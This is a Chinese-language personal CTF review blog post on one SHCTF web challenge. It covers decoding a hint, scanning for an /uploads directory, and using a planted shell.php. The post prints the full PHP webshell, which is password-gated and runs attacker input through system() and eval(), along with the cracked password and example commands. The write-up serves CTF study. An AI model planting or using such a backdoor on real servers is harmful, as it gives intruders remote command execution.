---
title: "SHCTF个人复盘"
image: ''
pinned: false
comment: true
published: 2026-02-13
description: "学习复盘"
category: 复盘
tags: [复盘]
---

















这是一个个人重新复盘在SHCTF中看见的不足和学习到的知识点。

# Challenge Info - [阶段1] 05_em_v_CFK :

首先来讲，这个题目靶机的前端页面下隐藏了一段密文，十分明显，通过随波逐流的一键解密直接得到隐藏信息，

> 我上传了个 shell.php，带上 show 参数 get 小明的圣遗物吧

由此可见，即存在webshell，需要我们自行寻找，简单尝试，最终通过disearch的工具扫描发现了存在/uploads目录，那就极有可能，webshell是藏在uploads目录下的，直接尝试/uploads/shell.php?show=1，得到了题目的隐藏信息。

这边的考点就是猜测目录，然后尝试调用webshell。

```
<?php
if (isset($_GET['show'])) {
highlight_file(__FILE__);
}
$pass = 'c4d038b4bed09fdb1471ef51ec3a32cd';
if (isset($_POST['key']) && md5($_POST['key']) === $pass) {
if (isset($_POST['cmd'])) {
system($_POST['cmd']);
} elseif (isset($_POST['code'])) {
eval($_POST['code']);
}
} else {
http_response_code(404);
}
```

这里的webshell并不像我想象中的直接执行命令的shell，而是给了一段php代码。

内容大抵是：

当读取shell.php带有show参数时，高亮显示源码。

参数key存在且md5哈希强制等于pass的值，直接通过md5的在线碰撞就能得到114514，之后可以使用cmd执行或者code执行命令。

cmd由于设置是 `system($_POST['cmd']);` ，相当于是直接在linux系统下执行，类似ls，cat，whoami的直接命令执行；而code就不一样了，它给的是 `eval($_POST['code']);` ，需要的是我们使用php语句的命令，比如phpinfo();`, `echo "hello";`, `include('config.php') ，两者存在差别，但起到的效果大差不差。





















---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
